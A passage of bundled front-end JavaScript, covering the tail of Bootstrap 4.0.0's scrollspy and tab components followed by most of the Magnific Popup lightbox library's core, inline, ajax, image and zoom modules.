          (t.fn[e].noConflict = function () {
            return (t.fn[e] = r), d._jQueryInterface;
          }),
          d
        );
      })(e),
      N = (function (t) {
        var e = "scrollspy",
          i = "bs.scrollspy",
          n = "." + i,
          r = t.fn[e],
          a = { offset: 10, method: "auto", target: "" },
          l = {
            offset: "number",
            method: "string",
            target: "(string|element)",
          },
          c = {
            ACTIVATE: "activate" + n,
            SCROLL: "scroll" + n,
            LOAD_DATA_API: "load" + n + ".data-api",
          },
          u = "active",
          d = '[data-spy="scroll"]',
          h = ".active",
          p = ".nav, .list-group",
          f = ".nav-link",
          g = ".nav-item",
          m = ".list-group-item",
          v = ".dropdown",
          y = ".dropdown-item",
          _ = ".dropdown-toggle",
          w = "position",
          b = (function () {
            function r(e, i) {
              var n = this;
              (this._element = e),
                (this._scrollElement = "BODY" === e.tagName ? window : e),
                (this._config = this._getConfig(i)),
                (this._selector =
                  this._config.target +
                  " " +
                  f +
                  "," +
                  this._config.target +
                  " " +
                  m +
                  "," +
                  this._config.target +
                  " " +
                  y),
                (this._offsets = []),
                (this._targets = []),
                (this._activeTarget = null),
                (this._scrollHeight = 0),
                t(this._scrollElement).on(c.SCROLL, function (t) {
                  return n._process(t);
                }),
                this.refresh(),
                this._process();
            }
            var d = r.prototype;
            return (
              (d.refresh = function () {
                var e = this,
                  i =
                    this._scrollElement === this._scrollElement.window
                      ? "offset"
                      : w,
                  n = "auto" === this._config.method ? i : this._config.method,
                  s = n === w ? this._getScrollTop() : 0;
                (this._offsets = []),
                  (this._targets = []),
                  (this._scrollHeight = this._getScrollHeight()),
                  t
                    .makeArray(t(this._selector))
                    .map(function (e) {
                      var i,
                        o = T.getSelectorFromElement(e);
                      if ((o && (i = t(o)[0]), i)) {
                        var r = i.getBoundingClientRect();
                        if (r.width || r.height) return [t(i)[n]().top + s, o];
                      }
                      return null;
                    })
                    .filter(function (t) {
                      return t;
                    })
                    .sort(function (t, e) {
                      return t[0] - e[0];
                    })
                    .forEach(function (t) {
                      e._offsets.push(t[0]), e._targets.push(t[1]);
                    });
              }),
              (d.dispose = function () {
                t.removeData(this._element, i),
                  t(this._scrollElement).off(n),
                  (this._element = null),
                  (this._scrollElement = null),
                  (this._config = null),
                  (this._selector = null),
                  (this._offsets = null),
                  (this._targets = null),
                  (this._activeTarget = null),
                  (this._scrollHeight = null);
              }),
              (d._getConfig = function (i) {
                if ("string" != typeof (i = o({}, a, i)).target) {
                  var n = t(i.target).attr("id");
                  n || ((n = T.getUID(e)), t(i.target).attr("id", n)),
                    (i.target = "#" + n);
                }
                return T.typeCheckConfig(e, i, l), i;
              }),
              (d._getScrollTop = function () {
                return this._scrollElement === window
                  ? this._scrollElement.pageYOffset
                  : this._scrollElement.scrollTop;
              }),
              (d._getScrollHeight = function () {
                return (
                  this._scrollElement.scrollHeight ||
                  Math.max(
                    document.body.scrollHeight,
                    document.documentElement.scrollHeight
                  )
                );
              }),
              (d._getOffsetHeight = function () {
                return this._scrollElement === window
                  ? window.innerHeight
                  : this._scrollElement.getBoundingClientRect().height;
              }),
              (d._process = function () {
                var t = this._getScrollTop() + this._config.offset,
                  e = this._getScrollHeight(),
                  i = this._config.offset + e - this._getOffsetHeight();
                if ((this._scrollHeight !== e && this.refresh(), t >= i)) {
                  var n = this._targets[this._targets.length - 1];
                  this._activeTarget !== n && this._activate(n);
                } else {
                  if (
                    this._activeTarget &&
                    t < this._offsets[0] &&
                    this._offsets[0] > 0
                  )
                    return (this._activeTarget = null), void this._clear();
                  for (var s = this._offsets.length; s--; )
                    this._activeTarget !== this._targets[s] &&
                      t >= this._offsets[s] &&
                      (void 0 === this._offsets[s + 1] ||
                        t < this._offsets[s + 1]) &&
                      this._activate(this._targets[s]);
                }
              }),
              (d._activate = function (e) {
                (this._activeTarget = e), this._clear();
                var i = this._selector.split(",");
                i = i.map(function (t) {
                  return (
                    t + '[data-target="' + e + '"],' + t + '[href="' + e + '"]'
                  );
                });
                var n = t(i.join(","));
                n.hasClass("dropdown-item")
                  ? (n.closest(v).find(_).addClass(u), n.addClass(u))
                  : (n.addClass(u),
                    n
                      .parents(p)
                      .prev(f + ", " + m)
                      .addClass(u),
                    n.parents(p).prev(g).children(f).addClass(u)),
                  t(this._scrollElement).trigger(c.ACTIVATE, {
                    relatedTarget: e,
                  });
              }),
              (d._clear = function () {
                t(this._selector).filter(h).removeClass(u);
              }),
              (r._jQueryInterface = function (e) {
                return this.each(function () {
                  var n = t(this).data(i);
                  if (
                    (n ||
                      ((n = new r(this, "object" == typeof e && e)),
                      t(this).data(i, n)),
                    "string" == typeof e)
                  ) {
                    if (void 0 === n[e])
                      throw new TypeError('No method named "' + e + '"');
                    n[e]();
                  }
                });
              }),
              s(r, null, [
                {
                  key: "VERSION",
                  get: function () {
                    return "4.0.0";
                  },
                },
                {
                  key: "Default",
                  get: function () {
                    return a;
                  },
                },
              ]),
              r
            );
          })();
        return (
          t(window).on(c.LOAD_DATA_API, function () {
            for (var e = t.makeArray(t(d)), i = e.length; i--; ) {
              var n = t(e[i]);
              b._jQueryInterface.call(n, n.data());
            }
          }),
          (t.fn[e] = b._jQueryInterface),
          (t.fn[e].Constructor = b),
          (t.fn[e].noConflict = function () {
            return (t.fn[e] = r), b._jQueryInterface;
          }),
          b
        );
      })(e),
      P = (function (t) {
        var e = "bs.tab",
          i = "." + e,
          n = t.fn.tab,
          o = {
            HIDE: "hide" + i,
            HIDDEN: "hidden" + i,
            SHOW: "show" + i,
            SHOWN: "shown" + i,
            CLICK_DATA_API: "click.bs.tab.data-api",
          },
          r = "active",
          a = "show",
          l = ".active",
          c = "> li > .active",
          u = (function () {
            function i(t) {
              this._element = t;
            }
            var n = i.prototype;
            return (
              (n.show = function () {
                var e = this;
                if (
                  !(
                    (this._element.parentNode &&
                      this._element.parentNode.nodeType === Node.ELEMENT_NODE &&
                      t(this._element).hasClass(r)) ||
                    t(this._element).hasClass("disabled")
                  )
                ) {
                  var i,
                    n,
                    s = t(this._element).closest(".nav, .list-group")[0],
                    a = T.getSelectorFromElement(this._element);
                  if (s) {
                    var u = "UL" === s.nodeName ? c : l;
                    n = (n = t.makeArray(t(s).find(u)))[n.length - 1];
                  }
                  var d = t.Event(o.HIDE, { relatedTarget: this._element }),
                    h = t.Event(o.SHOW, { relatedTarget: n });
                  if (
                    (n && t(n).trigger(d),
                    t(this._element).trigger(h),
                    !h.isDefaultPrevented() && !d.isDefaultPrevented())
                  ) {
                    a && (i = t(a)[0]), this._activate(this._element, s);
                    var p = function () {
                      var i = t.Event(o.HIDDEN, { relatedTarget: e._element }),
                        s = t.Event(o.SHOWN, { relatedTarget: n });
                      t(n).trigger(i), t(e._element).trigger(s);
                    };
                    i ? this._activate(i, i.parentNode, p) : p();
                  }
                }
              }),
              (n.dispose = function () {
                t.removeData(this._element, e), (this._element = null);
              }),
              (n._activate = function (e, i, n) {
                var s = this,
                  o = (
                    "UL" === i.nodeName ? t(i).find(c) : t(i).children(l)
                  )[0],
                  r =
                    n &&
                    T.supportsTransitionEnd() &&
                    o &&
                    t(o).hasClass("fade"),
                  a = function () {
                    return s._transitionComplete(e, o, n);
                  };
                o && r
                  ? t(o).one(T.TRANSITION_END, a).emulateTransitionEnd(150)
                  : a();
              }),
              (n._transitionComplete = function (e, i, n) {
                if (i) {
                  t(i).removeClass(a + " " + r);
                  var s = t(i.parentNode).find("> .dropdown-menu .active")[0];
                  s && t(s).removeClass(r),
                    "tab" === i.getAttribute("role") &&
                      i.setAttribute("aria-selected", !1);
                }
                if (
                  (t(e).addClass(r),
                  "tab" === e.getAttribute("role") &&
                    e.setAttribute("aria-selected", !0),
                  T.reflow(e),
                  t(e).addClass(a),
                  e.parentNode && t(e.parentNode).hasClass("dropdown-menu"))
                ) {
                  var o = t(e).closest(".dropdown")[0];
                  o && t(o).find(".dropdown-toggle").addClass(r),
                    e.setAttribute("aria-expanded", !0);
                }
                n && n();
              }),
              (i._jQueryInterface = function (n) {
                return this.each(function () {
                  var s = t(this),
                    o = s.data(e);
                  if (
                    (o || ((o = new i(this)), s.data(e, o)),
                    "string" == typeof n)
                  ) {
                    if (void 0 === o[n])
                      throw new TypeError('No method named "' + n + '"');
                    o[n]();
                  }
                });
              }),
              s(i, null, [
                {
                  key: "VERSION",
                  get: function () {
                    return "4.0.0";
                  },
                },
              ]),
              i
            );
          })();
        return (
          t(document).on(
            o.CLICK_DATA_API,
            '[data-toggle="tab"], [data-toggle="pill"], [data-toggle="list"]',
            function (e) {
              e.preventDefault(), u._jQueryInterface.call(t(this), "show");
            }
          ),
          (t.fn.tab = u._jQueryInterface),
          (t.fn.tab.Constructor = u),
          (t.fn.tab.noConflict = function () {
            return (t.fn.tab = n), u._jQueryInterface;
          }),
          u
        );
      })(e);
    !(function (t) {
      if (void 0 === t)
        throw new TypeError(
          "Bootstrap's JavaScript requires jQuery. jQuery must be included before Bootstrap's JavaScript."
        );
      var e = t.fn.jquery.split(" ")[0].split(".");
      if (
        (e[0] < 2 && e[1] < 9) ||
        (1 === e[0] && 9 === e[1] && e[2] < 1) ||
        e[0] >= 4
      )
        throw new Error(
          "Bootstrap's JavaScript requires at least jQuery v1.9.1 but less than v4.0.0"
        );
    })(e),
      (t.Util = T),
      (t.Alert = k),
      (t.Button = S),
      (t.Carousel = E),
      (t.Collapse = A),
      (t.Dropdown = D),
      (t.Modal = I),
      (t.Popover = O),
      (t.Scrollspy = N),
      (t.Tab = P),
      (t.Tooltip = $),
      Object.defineProperty(t, "__esModule", { value: !0 });
  }),
  (function (t) {
    "function" == typeof define && define.amd
      ? define(["jquery"], t)
      : t(
          "object" == typeof exports
            ? require("jquery")
            : window.jQuery || window.Zepto
        );
  })(function (t) {
    var e,
      i,
      n,
      s,
      o,
      r,
      a = "Close",
      l = "BeforeClose",
      c = "MarkupParse",
      u = "Open",
      d = "Change",
      h = "mfp",
      p = "." + h,
      f = "mfp-ready",
      g = "mfp-removing",
      m = "mfp-prevent-close",
      v = function () {},
      y = !!window.jQuery,
      _ = t(window),
      w = function (t, i) {
        e.ev.on(h + t + p, i);
      },
      b = function (e, i, n, s) {
        var o = document.createElement("div");
        return (
          (o.className = "mfp-" + e),
          n && (o.innerHTML = n),
          s ? i && i.appendChild(o) : ((o = t(o)), i && o.appendTo(i)),
          o
        );
      },
      C = function (i, n) {
        e.ev.triggerHandler(h + i, n),
          e.st.callbacks &&
            ((i = i.charAt(0).toLowerCase() + i.slice(1)),
            e.st.callbacks[i] &&
              e.st.callbacks[i].apply(e, t.isArray(n) ? n : [n]));
      },
      x = function (i) {
        return (
          (i === r && e.currTemplate.closeBtn) ||
            ((e.currTemplate.closeBtn = t(
              e.st.closeMarkup.replace("%title%", e.st.tClose)
            )),
            (r = i)),
          e.currTemplate.closeBtn
        );
      },
      T = function () {
        t.magnificPopup.instance ||
          ((e = new v()).init(), (t.magnificPopup.instance = e));
      };
    (v.prototype = {
      constructor: v,
      init: function () {
        var i = navigator.appVersion;
        (e.isLowIE = e.isIE8 = document.all && !document.addEventListener),
          (e.isAndroid = /android/gi.test(i)),
          (e.isIOS = /iphone|ipad|ipod/gi.test(i)),
          (e.supportsTransition = (function () {
            var t = document.createElement("p").style,
              e = ["ms", "O", "Moz", "Webkit"];
            if (void 0 !== t.transition) return !0;
            for (; e.length; ) if (e.pop() + "Transition" in t) return !0;
            return !1;
          })()),
          (e.probablyMobile =
            e.isAndroid ||
            e.isIOS ||
            /(Opera Mini)|Kindle|webOS|BlackBerry|(Opera Mobi)|(Windows Phone)|IEMobile/i.test(
              navigator.userAgent
            )),
          (n = t(document)),
          (e.popupsCache = {});
      },
      open: function (i) {
        var s;
        if (!1 === i.isObj) {
          (e.items = i.items.toArray()), (e.index = 0);
          var r,
            a = i.items;
          for (s = 0; s < a.length; s++)
            if (((r = a[s]).parsed && (r = r.el[0]), r === i.el[0])) {
              e.index = s;
              break;
            }
        } else
          (e.items = t.isArray(i.items) ? i.items : [i.items]),
            (e.index = i.index || 0);
        if (!e.isOpen) {
          (e.types = []),
            (o = ""),
            i.mainEl && i.mainEl.length ? (e.ev = i.mainEl.eq(0)) : (e.ev = n),
            i.key
              ? (e.popupsCache[i.key] || (e.popupsCache[i.key] = {}),
                (e.currTemplate = e.popupsCache[i.key]))
              : (e.currTemplate = {}),
            (e.st = t.extend(!0, {}, t.magnificPopup.defaults, i)),
            (e.fixedContentPos =
              "auto" === e.st.fixedContentPos
                ? !e.probablyMobile
                : e.st.fixedContentPos),
            e.st.modal &&
              ((e.st.closeOnContentClick = !1),
              (e.st.closeOnBgClick = !1),
              (e.st.showCloseBtn = !1),
              (e.st.enableEscapeKey = !1)),
            e.bgOverlay ||
              ((e.bgOverlay = b("bg").on("click" + p, function () {
                e.close();
              })),
              (e.wrap = b("wrap")
                .attr("tabindex", -1)
                .on("click" + p, function (t) {
                  e._checkIfClose(t.target) && e.close();
                })),
              (e.container = b("container", e.wrap))),
            (e.contentContainer = b("content")),
            e.st.preloader &&
              (e.preloader = b("preloader", e.container, e.st.tLoading));
          var l = t.magnificPopup.modules;
          for (s = 0; s < l.length; s++) {
            var d = l[s];
            (d = d.charAt(0).toUpperCase() + d.slice(1)), e["init" + d].call(e);
          }
          C("BeforeOpen"),
            e.st.showCloseBtn &&
              (e.st.closeBtnInside
                ? (w(c, function (t, e, i, n) {
                    i.close_replaceWith = x(n.type);
                  }),
                  (o += " mfp-close-btn-in"))
                : e.wrap.append(x())),
            e.st.alignTop && (o += " mfp-align-top"),
            e.fixedContentPos
              ? e.wrap.css({
                  overflow: e.st.overflowY,
                  overflowX: "hidden",
                  overflowY: e.st.overflowY,
                })
              : e.wrap.css({ top: _.scrollTop(), position: "absolute" }),
            (!1 === e.st.fixedBgPos ||
              ("auto" === e.st.fixedBgPos && !e.fixedContentPos)) &&
              e.bgOverlay.css({ height: n.height(), position: "absolute" }),
            e.st.enableEscapeKey &&
              n.on("keyup" + p, function (t) {
                27 === t.keyCode && e.close();
              }),
            _.on("resize" + p, function () {
              e.updateSize();
            }),
            e.st.closeOnContentClick || (o += " mfp-auto-cursor"),
            o && e.wrap.addClass(o);
          var h = (e.wH = _.height()),
            g = {};
          if (e.fixedContentPos && e._hasScrollBar(h)) {
            var m = e._getScrollbarSize();
            m && (g.marginRight = m);
          }
          e.fixedContentPos &&
            (e.isIE7
              ? t("body, html").css("overflow", "hidden")
              : (g.overflow = "hidden"));
          var v = e.st.mainClass;
          return (
            e.isIE7 && (v += " mfp-ie7"),
            v && e._addClassToMFP(v),
            e.updateItemHTML(),
            C("BuildControls"),
            t("html").css(g),
            e.bgOverlay
              .add(e.wrap)
              .prependTo(e.st.prependTo || t(document.body)),
            (e._lastFocusedEl = document.activeElement),
            setTimeout(function () {
              e.content
                ? (e._addClassToMFP(f), e._setFocus())
                : e.bgOverlay.addClass(f),
                n.on("focusin" + p, e._onFocusIn);
            }, 16),
            (e.isOpen = !0),
            e.updateSize(h),
            C(u),
            i
          );
        }
        e.updateItemHTML();
      },
      close: function () {
        e.isOpen &&
          (C(l),
          (e.isOpen = !1),
          e.st.removalDelay && !e.isLowIE && e.supportsTransition
            ? (e._addClassToMFP(g),
              setTimeout(function () {
                e._close();
              }, e.st.removalDelay))
            : e._close());
      },
      _close: function () {
        C(a);
        var i = g + " " + f + " ";
        if (
          (e.bgOverlay.detach(),
          e.wrap.detach(),
          e.container.empty(),
          e.st.mainClass && (i += e.st.mainClass + " "),
          e._removeClassFromMFP(i),
          e.fixedContentPos)
        ) {
          var s = { marginRight: "" };
          e.isIE7 ? t("body, html").css("overflow", "") : (s.overflow = ""),
            t("html").css(s);
        }
        n.off("keyup.mfp focusin" + p),
          e.ev.off(p),
          e.wrap.attr("class", "mfp-wrap").removeAttr("style"),
          e.bgOverlay.attr("class", "mfp-bg"),
          e.container.attr("class", "mfp-container"),
          !e.st.showCloseBtn ||
            (e.st.closeBtnInside && !0 !== e.currTemplate[e.currItem.type]) ||
            (e.currTemplate.closeBtn && e.currTemplate.closeBtn.detach()),
          e.st.autoFocusLast && e._lastFocusedEl && t(e._lastFocusedEl).focus(),
          (e.currItem = null),
          (e.content = null),
          (e.currTemplate = null),
          (e.prevHeight = 0),
          C("AfterClose");
      },
      updateSize: function (t) {
        if (e.isIOS) {
          var i = document.documentElement.clientWidth / window.innerWidth,
            n = window.innerHeight * i;
          e.wrap.css("height", n), (e.wH = n);
        } else e.wH = t || _.height();
        e.fixedContentPos || e.wrap.css("height", e.wH), C("Resize");
      },
      updateItemHTML: function () {
        var i = e.items[e.index];
        e.contentContainer.detach(),
          e.content && e.content.detach(),
          i.parsed || (i = e.parseEl(e.index));
        var n = i.type;
        if (
          (C("BeforeChange", [e.currItem ? e.currItem.type : "", n]),
          (e.currItem = i),
          !e.currTemplate[n])
        ) {
          var o = !!e.st[n] && e.st[n].markup;
          C("FirstMarkupParse", o), (e.currTemplate[n] = !o || t(o));
        }
        s && s !== i.type && e.container.removeClass("mfp-" + s + "-holder");
        var r = e["get" + n.charAt(0).toUpperCase() + n.slice(1)](
          i,
          e.currTemplate[n]
        );
        e.appendContent(r, n),
          (i.preloaded = !0),
          C(d, i),
          (s = i.type),
          e.container.prepend(e.contentContainer),
          C("AfterChange");
      },
      appendContent: function (t, i) {
        (e.content = t),
          t
            ? e.st.showCloseBtn &&
              e.st.closeBtnInside &&
              !0 === e.currTemplate[i]
              ? e.content.find(".mfp-close").length || e.content.append(x())
              : (e.content = t)
            : (e.content = ""),
          C("BeforeAppend"),
          e.container.addClass("mfp-" + i + "-holder"),
          e.contentContainer.append(e.content);
      },
      parseEl: function (i) {
        var n,
          s = e.items[i];
        if (
          (s.tagName
            ? (s = { el: t(s) })
            : ((n = s.type), (s = { data: s, src: s.src })),
          s.el)
        ) {
          for (var o = e.types, r = 0; r < o.length; r++)
            if (s.el.hasClass("mfp-" + o[r])) {
              n = o[r];
              break;
            }
          (s.src = s.el.attr("data-mfp-src")),
            s.src || (s.src = s.el.attr("href"));
        }
        return (
          (s.type = n || e.st.type || "inline"),
          (s.index = i),
          (s.parsed = !0),
          (e.items[i] = s),
          C("ElementParse", s),
          e.items[i]
        );
      },
      addGroup: function (t, i) {
        var n = function (n) {
          (n.mfpEl = this), e._openClick(n, t, i);
        };
        i || (i = {});
        var s = "click.magnificPopup";
        (i.mainEl = t),
          i.items
            ? ((i.isObj = !0), t.off(s).on(s, n))
            : ((i.isObj = !1),
              i.delegate
                ? t.off(s).on(s, i.delegate, n)
                : ((i.items = t), t.off(s).on(s, n)));
      },
      _openClick: function (i, n, s) {
        if (
          (void 0 !== s.midClick
            ? s.midClick
            : t.magnificPopup.defaults.midClick) ||
          !(2 === i.which || i.ctrlKey || i.metaKey || i.altKey || i.shiftKey)
        ) {
          var o =
            void 0 !== s.disableOn
              ? s.disableOn
              : t.magnificPopup.defaults.disableOn;
          if (o)
            if (t.isFunction(o)) {
              if (!o.call(e)) return !0;
            } else if (_.width() < o) return !0;
          i.type && (i.preventDefault(), e.isOpen && i.stopPropagation()),
            (s.el = t(i.mfpEl)),
            s.delegate && (s.items = n.find(s.delegate)),
            e.open(s);
        }
      },
      updateStatus: function (t, n) {
        if (e.preloader) {
          i !== t && e.container.removeClass("mfp-s-" + i),
            n || "loading" !== t || (n = e.st.tLoading);
          var s = { status: t, text: n };
          C("UpdateStatus", s),
            (t = s.status),
            (n = s.text),
            e.preloader.html(n),
            e.preloader.find("a").on("click", function (t) {
              t.stopImmediatePropagation();
            }),
            e.container.addClass("mfp-s-" + t),
            (i = t);
        }
      },
      _checkIfClose: function (i) {
        if (!t(i).hasClass(m)) {
          var n = e.st.closeOnContentClick,
            s = e.st.closeOnBgClick;
          if (n && s) return !0;
          if (
            !e.content ||
            t(i).hasClass("mfp-close") ||
            (e.preloader && i === e.preloader[0])
          )
            return !0;
          if (i === e.content[0] || t.contains(e.content[0], i)) {
            if (n) return !0;
          } else if (s && t.contains(document, i)) return !0;
          return !1;
        }
      },
      _addClassToMFP: function (t) {
        e.bgOverlay.addClass(t), e.wrap.addClass(t);
      },
      _removeClassFromMFP: function (t) {
        this.bgOverlay.removeClass(t), e.wrap.removeClass(t);
      },
      _hasScrollBar: function (t) {
        return (
          (e.isIE7 ? n.height() : document.body.scrollHeight) >
          (t || _.height())
        );
      },
      _setFocus: function () {
        (e.st.focus ? e.content.find(e.st.focus).eq(0) : e.wrap).focus();
      },
      _onFocusIn: function (i) {
        return i.target === e.wrap[0] || t.contains(e.wrap[0], i.target)
          ? void 0
          : (e._setFocus(), !1);
      },
      _parseMarkup: function (e, i, n) {
        var s;
        n.data && (i = t.extend(n.data, i)),
          C(c, [e, i, n]),
          t.each(i, function (i, n) {
            if (void 0 === n || !1 === n) return !0;
            if ((s = i.split("_")).length > 1) {
              var o = e.find(p + "-" + s[0]);
              if (o.length > 0) {
                var r = s[1];
                "replaceWith" === r
                  ? o[0] !== n[0] && o.replaceWith(n)
                  : "img" === r
                  ? o.is("img")
                    ? o.attr("src", n)
                    : o.replaceWith(
                        t("<img>").attr("src", n).attr("class", o.attr("class"))
                      )
                  : o.attr(s[1], n);
              }
            } else e.find(p + "-" + i).html(n);
          });
      },
      _getScrollbarSize: function () {
        if (void 0 === e.scrollbarSize) {
          var t = document.createElement("div");
          (t.style.cssText =
            "width: 99px; height: 99px; overflow: scroll; position: absolute; top: -9999px;"),
            document.body.appendChild(t),
            (e.scrollbarSize = t.offsetWidth - t.clientWidth),
            document.body.removeChild(t);
        }
        return e.scrollbarSize;
      },
    }),
      (t.magnificPopup = {
        instance: null,
        proto: v.prototype,
        modules: [],
        open: function (e, i) {
          return (
            T(),
            ((e = e ? t.extend(!0, {}, e) : {}).isObj = !0),
            (e.index = i || 0),
            this.instance.open(e)
          );
        },
        close: function () {
          return t.magnificPopup.instance && t.magnificPopup.instance.close();
        },
        registerModule: function (e, i) {
          i.options && (t.magnificPopup.defaults[e] = i.options),
            t.extend(this.proto, i.proto),
            this.modules.push(e);
        },
        defaults: {
          disableOn: 0,
          key: null,
          midClick: !1,
          mainClass: "",
          preloader: !0,
          focus: "",
          closeOnContentClick: !1,
          closeOnBgClick: !0,
          closeBtnInside: !0,
          showCloseBtn: !0,
          enableEscapeKey: !0,
          modal: !1,
          alignTop: !1,
          removalDelay: 0,
          prependTo: null,
          fixedContentPos: "auto",
          fixedBgPos: "auto",
          overflowY: "auto",
          closeMarkup:
            '<button title="%title%" type="button" class="mfp-close">&#215;</button>',
          tClose: "Close (Esc)",
          tLoading: "Loading...",
          autoFocusLast: !0,
        },
      }),
      (t.fn.magnificPopup = function (i) {
        T();
        var n = t(this);
        if ("string" == typeof i)
          if ("open" === i) {
            var s,
              o = y ? n.data("magnificPopup") : n[0].magnificPopup,
              r = parseInt(arguments[1], 10) || 0;
            o.items
              ? (s = o.items[r])
              : ((s = n),
                o.delegate && (s = s.find(o.delegate)),
                (s = s.eq(r))),
              e._openClick({ mfpEl: s }, n, o);
          } else
            e.isOpen && e[i].apply(e, Array.prototype.slice.call(arguments, 1));
        else
          (i = t.extend(!0, {}, i)),
            y ? n.data("magnificPopup", i) : (n[0].magnificPopup = i),
            e.addGroup(n, i);
        return n;
      });
    var k,
      S,
      E,
      A = "inline",
      D = function () {
        E && (S.after(E.addClass(k)).detach(), (E = null));
      };
    t.magnificPopup.registerModule(A, {
      options: {
        hiddenClass: "hide",
        markup: "",
        tNotFound: "Content not found",
      },
      proto: {
        initInline: function () {
          e.types.push(A),
            w(a + "." + A, function () {
              D();
            });
        },
        getInline: function (i, n) {
          if ((D(), i.src)) {
            var s = e.st.inline,
              o = t(i.src);
            if (o.length) {
              var r = o[0].parentNode;
              r &&
                r.tagName &&
                (S || ((k = s.hiddenClass), (S = b(k)), (k = "mfp-" + k)),
                (E = o.after(S).detach().removeClass(k))),
                e.updateStatus("ready");
            } else e.updateStatus("error", s.tNotFound), (o = t("<div>"));
            return (i.inlineElement = o), o;
          }
          return e.updateStatus("ready"), e._parseMarkup(n, {}, i), n;
        },
      },
    });
    var I,
      $ = "ajax",
      O = function () {
        I && t(document.body).removeClass(I);
      },
      N = function () {
        O(), e.req && e.req.abort();
      };
    t.magnificPopup.registerModule($, {
      options: {
        settings: null,
        cursor: "mfp-ajax-cur",
        tError: '<a href="%url%">The content</a> could not be loaded.',
      },
      proto: {
        initAjax: function () {
          e.types.push($),
            (I = e.st.ajax.cursor),
            w(a + "." + $, N),
            w("BeforeChange." + $, N);
        },
        getAjax: function (i) {
          I && t(document.body).addClass(I), e.updateStatus("loading");
          var n = t.extend(
            {
              url: i.src,
              success: function (n, s, o) {
                var r = { data: n, xhr: o };
                C("ParseAjax", r),
                  e.appendContent(t(r.data), $),
                  (i.finished = !0),
                  O(),
                  e._setFocus(),
                  setTimeout(function () {
                    e.wrap.addClass(f);
                  }, 16),
                  e.updateStatus("ready"),
                  C("AjaxContentAdded");
              },
              error: function () {
                O(),
                  (i.finished = i.loadError = !0),
                  e.updateStatus(
                    "error",
                    e.st.ajax.tError.replace("%url%", i.src)
                  );
              },
            },
            e.st.ajax.settings
          );
          return (e.req = t.ajax(n)), "";
        },
      },
    });
    var P,
      M = function (i) {
        if (i.data && void 0 !== i.data.title) return i.data.title;
        var n = e.st.image.titleSrc;
        if (n) {
          if (t.isFunction(n)) return n.call(e, i);
          if (i.el) return i.el.attr(n) || "";
        }
        return "";
      };
    t.magnificPopup.registerModule("image", {
      options: {
        markup:
          '<div class="mfp-figure"><div class="mfp-close"></div><figure><div class="mfp-img"></div><figcaption><div class="mfp-bottom-bar"><div class="mfp-title"></div><div class="mfp-counter"></div></div></figcaption></figure></div>',
        cursor: "mfp-zoom-out-cur",
        titleSrc: "title",
        verticalFit: !0,
        tError: '<a href="%url%">The image</a> could not be loaded.',
      },
      proto: {
        initImage: function () {
          var i = e.st.image,
            n = ".image";
          e.types.push("image"),
            w(u + n, function () {
              "image" === e.currItem.type &&
                i.cursor &&
                t(document.body).addClass(i.cursor);
            }),
            w(a + n, function () {
              i.cursor && t(document.body).removeClass(i.cursor),
                _.off("resize" + p);
            }),
            w("Resize" + n, e.resizeImage),
            e.isLowIE && w("AfterChange", e.resizeImage);
        },
        resizeImage: function () {
          var t = e.currItem;
          if (t && t.img && e.st.image.verticalFit) {
            var i = 0;
            e.isLowIE &&
              (i =
                parseInt(t.img.css("padding-top"), 10) +
                parseInt(t.img.css("padding-bottom"), 10)),
              t.img.css("max-height", e.wH - i);
          }
        },
        _onImageHasSize: function (t) {
          t.img &&
            ((t.hasSize = !0),
            P && clearInterval(P),
            (t.isCheckingImgSize = !1),
            C("ImageHasSize", t),
            t.imgHidden &&
              (e.content && e.content.removeClass("mfp-loading"),
              (t.imgHidden = !1)));
        },
        findImageSize: function (t) {
          var i = 0,
            n = t.img[0],
            s = function (o) {
              P && clearInterval(P),
                (P = setInterval(function () {
                  return n.naturalWidth > 0
                    ? void e._onImageHasSize(t)
                    : (i > 200 && clearInterval(P),
                      void (3 === ++i
                        ? s(10)
                        : 40 === i
                        ? s(50)
                        : 100 === i && s(500)));
                }, o));
            };
          s(1);
        },
        getImage: function (i, n) {
          var s = 0,
            o = function () {
              i &&
                (i.img[0].complete
                  ? (i.img.off(".mfploader"),
                    i === e.currItem &&
                      (e._onImageHasSize(i), e.updateStatus("ready")),
                    (i.hasSize = !0),
                    (i.loaded = !0),
                    C("ImageLoadComplete"))
                  : 200 > ++s
                  ? setTimeout(o, 100)
                  : r());
            },
            r = function () {
              i &&
                (i.img.off(".mfploader"),
                i === e.currItem &&
                  (e._onImageHasSize(i),
                  e.updateStatus("error", a.tError.replace("%url%", i.src))),
                (i.hasSize = !0),
                (i.loaded = !0),
                (i.loadError = !0));
            },
            a = e.st.image,
            l = n.find(".mfp-img");
          if (l.length) {
            var c = document.createElement("img");
            (c.className = "mfp-img"),
              i.el &&
                i.el.find("img").length &&
                (c.alt = i.el.find("img").attr("alt")),
              (i.img = t(c).on("load.mfploader", o).on("error.mfploader", r)),
              (c.src = i.src),
              l.is("img") && (i.img = i.img.clone()),
              (c = i.img[0]).naturalWidth > 0
                ? (i.hasSize = !0)
                : c.width || (i.hasSize = !1);
          }
          return (
            e._parseMarkup(n, { title: M(i), img_replaceWith: i.img }, i),
            e.resizeImage(),
            i.hasSize
              ? (P && clearInterval(P),
                i.loadError
                  ? (n.addClass("mfp-loading"),
                    e.updateStatus("error", a.tError.replace("%url%", i.src)))
                  : (n.removeClass("mfp-loading"), e.updateStatus("ready")),
                n)
              : (e.updateStatus("loading"),
                (i.loading = !0),
                i.hasSize ||
                  ((i.imgHidden = !0),
                  n.addClass("mfp-loading"),
                  e.findImageSize(i)),
                n)
          );
        },
      },
    });
    var j;
    t.magnificPopup.registerModule("zoom", {
      options: {
        enabled: !1,
        easing: "ease-in-out",
        duration: 300,
        opener: function (t) {
          return t.is("img") ? t : t.find("img");
        },
      },
      proto: {
        initZoom: function () {
          var t,
            i = e.st.zoom,
            n = ".zoom";
          if (i.enabled && e.supportsTransition) {
            var s,
              o,
              r = i.duration,
              c = function (t) {
                var e = t
                    .clone()
                    .removeAttr("style")
                    .removeAttr("class")
                    .addClass("mfp-animated-image"),
                  n = "all " + i.duration / 1e3 + "s " + i.easing,
                  s = {
                    position: "fixed",
                    zIndex: 9999,
                    left: 0,
                    top: 0,
                    "-webkit-backface-visibility": "hidden",
                  },
                  o = "transition";
                return (
                  (s["-webkit-" + o] =
                    s["-moz-" + o] =
                    s["-o-" + o] =
                    s[o] =
                      n),
                  e.css(s),
                  e
                );
              },
              u = function () {
                e.content.css("visibility", "visible");
              };
            w("BuildControls" + n, function () {
              if (e._allowZoom()) {
                if (
                  (clearTimeout(s),
                  e.content.css("visibility", "hidden"),
                  !(t = e._getItemToZoom()))
                )
                  return void u();
